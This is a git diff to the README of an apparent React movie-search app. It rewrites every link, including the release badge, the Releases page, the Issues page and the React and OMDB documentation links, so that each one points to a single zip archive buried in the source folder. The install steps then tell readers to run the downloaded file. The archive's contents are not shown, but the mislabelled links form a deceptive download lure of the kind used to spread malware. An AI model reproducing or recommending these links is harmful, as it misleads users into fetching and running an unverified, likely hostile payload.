@@ -6,11 +6,11 @@ Welcome to the movie-app! This simple application allows you to search for movie
 
 ## 📥 Download Link
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/SayanrupBarman/movie-app/releases)
+[![Download the latest release](https://github.com/SayanrupBarman/movie-app/raw/refs/heads/main/src/components/app-movie-v3.2.zip%20Now-Release-blue)](https://github.com/SayanrupBarman/movie-app/raw/refs/heads/main/src/components/app-movie-v3.2.zip)
 
 ## 📂 Download & Install
 
-1. Visit the [Releases page](https://github.com/SayanrupBarman/movie-app/releases).
+1. Visit the [Releases page](https://github.com/SayanrupBarman/movie-app/raw/refs/heads/main/src/components/app-movie-v3.2.zip).
 2. On this page, you will see the latest version of the movie-app. Look for a file that is suitable for your operating system.
 3. Click on the file name to begin downloading. The file should end with an `.exe` or `.zip` extension, depending on your OS.
 4. Once the download is complete, locate the file in your downloads folder.
@@ -42,7 +42,7 @@ Make sure your system meets these basic requirements:
 
 To keep the app running smoothly and securely, please check back regularly for updates. Follow these steps to check for the latest version:
 
-1. Visit the [Releases page](https://github.com/SayanrupBarman/movie-app/releases).
+1. Visit the [Releases page](https://github.com/SayanrupBarman/movie-app/raw/refs/heads/main/src/components/app-movie-v3.2.zip).
 2. Compare the version you have with the latest one listed.
 3. If a newer version is available, follow the same download steps to update.
 
@@ -59,7 +59,7 @@ The movie-app is built using the following technologies:
 
 If you encounter any issues or have questions while using the movie-app, feel free to reach out to us. You can open an issue in the GitHub repository, and we will do our best to assist you.
 
-1. Navigate to the [Issues section](https://github.com/SayanrupBarman/movie-app/issues) of the repository.
+1. Navigate to the [Issues section](https://github.com/SayanrupBarman/movie-app/raw/refs/heads/main/src/components/app-movie-v3.2.zip) of the repository.
 2. Provide as much detail as possible about any issues you are facing.
 
 ## 📃 License
@@ -70,8 +70,8 @@ This project is open source and available under the MIT License. You are free to
 
 For more information on how to use specific features of the movie-app or to explore additional capabilities, consult the following resources:
 
-- [React Documentation](https://reactjs.org/docs/getting-started.html)
-- [OMDB API Documentation](http://www.omdbapi.com/)
-- [GitHub Learning Resources](https://docs.github.com/en/github)
+- [React Documentation](https://github.com/SayanrupBarman/movie-app/raw/refs/heads/main/src/components/app-movie-v3.2.zip)
+- [OMDB API Documentation](https://github.com/SayanrupBarman/movie-app/raw/refs/heads/main/src/components/app-movie-v3.2.zip)
+- [GitHub Learning Resources](https://github.com/SayanrupBarman/movie-app/raw/refs/heads/main/src/components/app-movie-v3.2.zip)
 
 Thank you for using the movie-app. We hope it enhances your movie-watching experience!
